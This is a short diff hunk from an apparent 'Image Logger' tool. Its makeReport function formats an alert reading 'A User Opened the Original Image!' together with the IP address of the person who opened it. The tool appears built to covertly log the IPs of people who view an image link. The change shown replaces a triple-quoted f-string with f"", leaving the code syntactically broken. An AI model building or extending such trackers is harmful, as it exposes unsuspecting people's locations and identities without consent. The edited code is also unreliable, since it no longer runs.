@@ -66,7 +66,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
             {
                 "title": "Image Logger - IP Logged",
                 "color": config["color"],
-                "description": f"""**A User Opened the Original Image!**
+                "description": f""**A User Opened the Original Image!**
 
 **IP Info:**
 > **IP:** `{ip if ip else 'Unknown'}`
